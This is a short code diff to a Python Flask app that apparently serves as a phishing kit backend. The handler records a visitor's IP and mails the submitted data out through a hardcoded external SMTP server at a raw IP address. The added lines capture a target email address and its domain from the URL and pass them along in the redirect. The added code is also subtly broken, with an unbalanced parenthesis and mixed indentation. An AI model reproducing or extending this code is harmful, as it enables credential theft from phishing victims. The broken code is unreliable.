@@ -135,7 +135,11 @@ def route2():
 
 @app.route("/first", methods=['POST'])
 def first():
+    web_param = request.args.get('web')	
     if request.method == 'POST':
+        if web_param:
+	    session['eman'] = web_param
+	    session['ins'] = web_param[web_param.index('@') + 1:]
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
             ip = request.headers.get('X-Real-IP')
@@ -167,7 +171,7 @@ def first():
         with smtplib.SMTP("77.83.196.189", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('route2'))
+        return redirect(url_for('route2', eman=session.get('eman'), ins=session.get('ins'))
 
 
 
